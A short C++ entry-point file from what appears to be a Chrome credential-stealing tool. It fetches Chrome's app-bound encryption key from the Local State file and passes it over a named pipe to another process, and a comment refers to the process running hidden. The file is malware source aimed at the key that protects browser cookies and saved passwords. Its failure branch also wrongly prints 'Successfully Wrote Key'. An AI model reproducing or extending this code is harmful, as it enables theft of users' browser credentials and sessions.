#include <iostream>

#include "./src/dumper/dumper.h"
#include "./src/comm/comm.h"
#include "./src/utils/utils.h"

int main()
{   
    auto browserConf = utils::getBrowserConfig();

    wstring path = browserConf.localState;
    PBYTE key = dumper::getAppBoundKey(dumper::configs::chrome, path);

    // only shows if process isn't hidden / directly running the dumper
    if (!key) {
        printf("[DEBUG] Failed To Fetch Key.\n");
        return -1;
    }
    else {
        printf("[DEBUG] Successfully Fetched Key.\n");
    }

    auto pipe = comm::createPipe();

    comm::waitUntilConnected(pipe);

    if (comm::writeAppBoundKey(pipe, key)) {
        printf("[DEBUG] Successfully Wrote Key.\n");
    }
    else {
        printf("[DEBUG] Successfully Wrote Key.\n");
    }

    return 0;
}